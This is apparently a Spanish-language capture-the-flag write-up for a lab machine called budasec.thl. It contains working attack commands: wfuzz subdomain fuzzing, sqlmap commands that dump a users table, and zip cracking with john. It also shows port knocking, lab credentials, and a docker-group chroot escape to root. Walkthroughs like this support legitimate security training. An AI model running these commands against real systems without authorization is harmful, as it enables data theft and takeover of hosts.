Hacemos el escaneo con nmap:
![[Pasted image 20240609180736.png]]
Visualizamos el contenido del puerto 80:
![[Pasted image 20240609180758.png]]
Visualizamos un robots.txt donde tenemos un dominio budasec.thl:
![[Pasted image 20240609181050.png]]
Añadimos este dominio al /etc/hosts y vemos un contador:
![[Pasted image 20240609181139.png]]
Vamos a hacer una búsqueda de subdominios con wfuzz, donde encontramos el subdominio dev:
```bash
wfuzz -c --hc=404 --hw=961 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.budasec.thl" http://budasec.thl
```
![[Pasted image 20240609181406.png]]
Y lo añadimos al /etc/hosts:
![[Pasted image 20240609181433.png]]
Nos encontramos con lo siguiente, un panel de inicio de sesión:
![[Pasted image 20240609181456.png]]
Si ponemos una comilla, vemos que da un error, por lo que puede ser vulnerable a una SQLi:
![[Pasted image 20240609181525.png]]
Por lo que hacemos el siguiente ataque con sqlmap:
```bash
sqlmap --url http://dev.budasec.thl/ --dbs --batch --forms
sqlmap --url http://dev.budasec.thl/ -D buda --tables --batch --forms
sqlmap --url http://dev.budasec.thl/ -D buda -T users --columns --batch --forms
sqlmap --url http://dev.budasec.thl/ -D buda -T users -C username,password --dump --batch --forms
```
Y obtenemos las siguientes credenciales:
```bash
admin:admin123
ftpuserf:tpu@sr123p@@s!
user1:password1
user2:password2
```
![[Pasted image 20240609181802.png]]
Para entrar por FTP lo haremos con el siguiente usuario:
```bash
ftpuser:ftpu@sr123p@@s!
```
De todos modos, vemos que no podemos enumerar porque está activado el modo pasivo, es decir, nosotros nos conectamos, pero hace falta que el servidor FTP abra otro puerto aleatorio donde podamos recibir la respuesta:
![[Pasted image 20240609181949.png]]
Ejecutamos el siguiente comando para desactivar el modo pasivo:
```bash
passive off
```
Y ahora sí podemos listar el contenido del servidor:
![[Pasted image 20240609182043.png]]
Y dentro de ftp/documents, tenemos los siguientes archivos, los cuales los interesantes son estos:
![[Pasted image 20240609182147.png]]
Si vemos el contenido de knock, vemos 3 puertos:
![[Pasted image 20240609182219.png]]
Se podría pensar que estamos ante un port knocking, lo cual consiste en enviar una serie específica de intentos de conexión a una secuencia predefinida de puertos cerrados. Estos intentos de conexión actúan como una contraseña o código secreto. Si la secuencia es correcta, el firewall detecta estos intentos y abre el puerto o los puertos necesarios para permitir el acceso al servicio deseado; y para poder efectuar esto mismo, tenemos la siguiente herramienta:
```bash
https://github.com/eliemoutran/KnockIt
```
![[Pasted image 20240609182404.png]]
Y para lanzar este ataque, debemos de ir probando distintos órdenes en los puertos, y tras varias pruebas, la combinación correcta es 1739 9467 8745:
```bash
python3 knock.py -b 192.168.0.40 1739 9467 8745
```
![[Pasted image 20240609183151.png]]
Y ahora si volvemos a hacer un escaneo de puertos con nmap, vemos que el puerto 22 sí está abierto:
![[Pasted image 20240609183221.png]]
Ahora para autenticarnos, debemos de crackear el .zip obtenido anteriormente:
```bash
zip2john documents.zip > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
Y obtenemos la contraseña manuelito:
![[Pasted image 20240609183559.png]]
Ahora vamos a extraer el contenido del documents.zip y leemos el audit2024 que hay en su interior, donde encontamos las credenciales del usuario yolanda:
```bash
yolanda:y@lAnd361!
```
![[Pasted image 20240609184449.png]]
Accedemos con estas credenciales por SSH y estamos dentro:
![[Pasted image 20240609184601.png]]
Vemos que el usuario yolanda se encuentra dentro del grupo docker:
![[Pasted image 20240609184659.png]]
Y tenemos las siguientes instrucciones en gtfobins para escalar privilegios:
![[Pasted image 20240609184738.png]]
Ejecutamos el siguiente comando:
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
Y nos habremos convertido en root:
![[Pasted image 20240609184820.png]]
Pero vemos que estamos dentro del contenedor pero a su vez tenemos acceso a la máquina anfitrión:
![[Pasted image 20240609184854.png]]
Con esto, cambiamos el permiso a la bash y podremos escalar:
![[Pasted image 20240609185132.png]]
